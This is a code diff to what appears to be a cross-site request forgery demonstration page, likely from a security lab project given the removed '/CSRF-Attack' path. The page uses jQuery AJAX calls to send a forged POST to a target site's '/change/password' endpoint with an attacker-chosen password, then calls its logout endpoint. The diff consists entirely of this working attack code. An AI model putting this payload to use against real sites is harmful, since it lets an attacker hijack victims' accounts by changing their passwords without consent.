@@ -14,13 +14,11 @@
                 url : '<?php echo $target_site?>/change/password',
                 type : 'POST', 
                 dataType : 'jsonp', 
-                data : { 
-                    password : 'toto'
-                }
+                data : "password=<?php echo $new_password?>"
             })
             .always(function(res) {
                 $.ajax({
-                    url : '<?php echo $target_site?>/CSRF-Attack/logout',
+                    url : '<?php echo $target_site?>/logout',
 					dataType : 'jsonp'
                 })
             });        
@@ -32,7 +30,7 @@
             })
             .always(function(res) {
                 $.ajax({
-                    url : '<?php echo $target_site?>/CSRF-Attack/logout',
+                    url : '<?php echo $target_site?>/logout',
 					dataType : 'jsonp'
                 })
             });        
